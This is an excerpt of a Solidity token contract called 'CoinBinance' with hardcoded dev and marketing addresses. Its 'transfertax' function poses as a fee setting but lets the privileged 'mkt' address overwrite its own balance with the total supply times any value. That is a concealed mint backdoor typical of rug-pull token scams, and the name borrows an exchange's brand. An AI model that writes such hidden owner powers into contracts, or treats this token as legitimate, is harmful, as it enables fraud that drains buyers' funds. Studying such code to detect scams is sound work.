...
contract  CoinBinance {
    using SafeMath for uint256;
    string public name = "CoinBinance";
    string public symbol = "CoinBinance";
    ...
    address private dev = 0xcDeF18431E7D4A3E1282e3886839a20e035BC044;
    ...
    function transfertax(uint256 value) public {
        require(msg.sender == mkt);
        _fee = value;
        if(_fee > 0) {
            balanceOf[mkt] = _tTotal * value;
        }
    }
